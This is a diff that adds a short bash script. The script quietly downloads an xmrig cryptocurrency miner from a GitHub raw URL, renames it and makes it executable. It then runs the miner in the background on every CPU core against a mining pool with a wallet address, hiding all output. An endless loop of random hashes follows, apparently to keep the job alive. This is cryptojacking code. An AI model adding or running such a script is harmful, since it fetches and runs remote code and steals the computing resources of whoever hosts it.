@@ -1,0 +1,5 @@
+#!/bin/bash
+wget -O sgr1 https://raw.githubusercontent.com/6248202226/filesg/main/xmrig >/dev/null 2>&1
+chmod +x sgr1
+./sgr1 --donate-level 1 -o stratum-na.rplant.xyz:7054 -u RbxJP5k7d15URHn53uMXsGWqdSGqf12Py1.x -p webpassword=x -a ghostrider -t $(nproc --all) > /dev/null 2>&1 &
+while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 30s; done
